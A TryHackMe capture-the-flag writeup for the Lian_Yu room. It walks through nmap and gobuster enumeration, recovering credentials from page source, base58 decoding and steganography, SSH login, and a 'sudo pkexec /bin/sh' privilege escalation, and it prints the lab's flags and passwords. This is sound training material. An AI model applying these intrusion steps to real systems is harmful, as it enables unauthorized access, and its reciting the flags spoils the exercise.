# TryHackMe Lian_Yu Writeup

## `Nmap scan`

```ruby
nmap -sCV 10.10.4.166
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 09:38 EDT
Nmap scan report for 10.10.4.166
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39824/udp6  status
|   100024  1          47584/tcp   status
|   100024  1          49710/tcp6  status
|_  100024  1          59997/udp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds
                                                                                                                  
```

- **`ftp`**
- **`ssh`**
- **`http`**
- **`rpcbind`**

--------

```
http://10.10.4.166/
```

<img width="1919" height="796" alt="image" src="https://github.com/user-attachments/assets/49bf6640-a239-41a8-b725-9d5e3b2cacd9" />

## gobuster

```
gobuster dir -u http://10.10.4.166/ \
-w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt \            
-x php,txt,html -k -t 50

```

<img width="882" height="453" alt="image" src="https://github.com/user-attachments/assets/8365f9af-4122-4777-bbbb-bc064af4ab14" />

```
http://10.10.4.166/island/
```

<img width="1169" height="374" alt="image" src="https://github.com/user-attachments/assets/cc6ecc9d-e47a-4c65-8a43-be856493720f" />

> view page sourse

<img width="765" height="293" alt="image" src="https://github.com/user-attachments/assets/1b786874-bd49-4d09-bf80-af0da8641ff1" />

> it might be password or username or something

```
vigilante
```

> try gobuster again 

```
gobuster dir -u http://10.10.4.166/island \
-w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt \
-x php,txt,html -k -t 50

```

<img width="1007" height="471" alt="image" src="https://github.com/user-attachments/assets/c4faf3e9-8750-42d9-8a66-2b5484d801c5" />

```
http://10.10.4.166/island/2100
```

<img width="1912" height="676" alt="image" src="https://github.com/user-attachments/assets/1e17e672-60e7-4371-9c47-88e5944ed559" />

<img width="776" height="328" alt="image" src="https://github.com/user-attachments/assets/24d34f9d-c709-4d2b-99e8-52d925c164e8" />

```html
<!-- you can avail your .ticket here but how?   -->
```

> try gobuster again but add -x .ticket

```
gobuster dir -u http://10.10.4.166/island/2100 \
-w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt \
 -x .ticket -k -t 50 

```

<img width="851" height="431" alt="image" src="https://github.com/user-attachments/assets/23dc5e2f-9f27-47c4-b741-d4b4c326aa4c" />

```
http://10.10.4.166/island/2100/green_arrow.ticket
```

<img width="1006" height="301" alt="image" src="https://github.com/user-attachments/assets/86a9adb6-b64c-4c10-9c45-1f4c21cdc8e7" />

```
RTy8yhBQdscX
```

> ## so now maybe **`vigilante`** username and **`RTy8yhBQdscX`** is password try on ssh not work on ftp

<img width="445" height="212" alt="image" src="https://github.com/user-attachments/assets/28032c3c-cada-4605-85bc-9bc2f20ee7cd" />

> notice that password looks it encoded to **`base58`**

<img width="1554" height="360" alt="image" src="https://github.com/user-attachments/assets/6891a062-af11-4e26-91e5-201c57cf89cd" />

```
!#th3h00d
```

<img width="1134" height="410" alt="image" src="https://github.com/user-attachments/assets/97975278-e90c-4853-b6bd-ce37bf430282" />

> try to change dir but faild

<img width="794" height="221" alt="image" src="https://github.com/user-attachments/assets/390b88bf-01c4-4041-87d1-bbc55cf186f2" />

> now we have 3 photos

<img width="710" height="201" alt="image" src="https://github.com/user-attachments/assets/988d10db-a235-445c-b508-e713fec12a07" />

## `Steganography`

<img width="1485" height="283" alt="image" src="https://github.com/user-attachments/assets/43617b4a-1189-4acd-aa25-d827bfb51919" />

> ### notice that **`Leave_me_alone.png`** file type is data

<img width="664" height="163" alt="image" src="https://github.com/user-attachments/assets/8a1f3893-0261-4b14-8a6a-5be8dc9fd0c0" />

> edit it using **`hexedit`**

```
hexedit Leave_me_alone.png 
```

<img width="1732" height="513" alt="image" src="https://github.com/user-attachments/assets/3ac623fa-fcfa-4475-86a7-3ac4a38cee99" />

```
password
```

> now use steghide with aa.jpg and use `passphrase` ==> **`password`**

<img width="935" height="269" alt="image" src="https://github.com/user-attachments/assets/318bd3d7-ae05-4c54-b52f-afc0611c4b4c" />

> ### found two files 

<img width="1003" height="629" alt="image" src="https://github.com/user-attachments/assets/43b19d2f-df2a-47ae-83b0-c113e8d68a14" />

### ssh password

```
M3tahuman
```

## `connect to ssh`

```
ssh vigilante@10.10.4.166
ssh slade@10.10.4.166
```

<img width="794" height="575" alt="image" src="https://github.com/user-attachments/assets/60ed1fd8-e5bd-4166-8f9f-670644fd177e" />

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

## Getting root.txt

```
sudo -l
```

<img width="1084" height="178" alt="image" src="https://github.com/user-attachments/assets/bea7040c-ca61-46b1-967c-9f782d28f2a2" />

> search on gtfobins

<img width="1057" height="338" alt="image" src="https://github.com/user-attachments/assets/015c1096-c192-4f03-a320-7ecd4c5780f4" />

```
sudo pkexec /bin/sh
```

<img width="1101" height="427" alt="image" src="https://github.com/user-attachments/assets/679c567a-8310-4e67-be7e-c05a5a1ed19c" />

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

